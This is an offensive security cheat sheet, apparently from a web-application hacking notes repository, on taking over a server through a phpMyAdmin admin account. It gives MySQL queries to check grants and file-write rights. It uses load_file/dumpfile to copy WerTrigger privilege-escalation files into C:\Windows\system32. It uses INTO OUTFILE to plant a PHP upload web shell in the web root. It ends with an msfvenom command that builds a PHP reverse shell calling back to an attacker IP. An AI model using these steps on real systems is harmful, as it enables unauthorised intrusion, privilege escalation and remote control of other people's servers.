### SQL
```
Check permissions:
SHOW GRANTS FOR 'root'@'localhost';

Show current user:
SELECT CURRENT_USER();

Check write permission:
show global variables like 'secure%';
```
### default port
80
### default url
http://ip:port/phpmyadmin
### phpmyadmin admin account to get system shell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md  
![image](https://github.com/KiritoLoveAsuna/WebApplicationSecurity/assets/38044499/2ff1fa35-dabd-4094-b6f1-8c4bfa05b076)   
Now, we are going to use the Privileged Write to move all of these files to C:\windows\system32 using MySQL.
```
select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';
select load_file('C:\\xampp\\htdocs\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';
select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';
```
![image](https://github.com/KiritoLoveAsuna/WebApplicationSecurity/assets/38044499/31df7857-e1f2-481d-88af-82142a8d164f)  
Now we can move into C:\windows\system32 and execute WerTrigger.exe

### Uploading shell via phpmyadmin
wamp root directory: C:/wamp/www
```
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
Then access http://ip:port/uploader.php
```
msfvenom -p php/reverse_php LHOST=192.168.49.57 LPORT=443 -f raw -o shell.php
access http://ip:port/shell.php
```
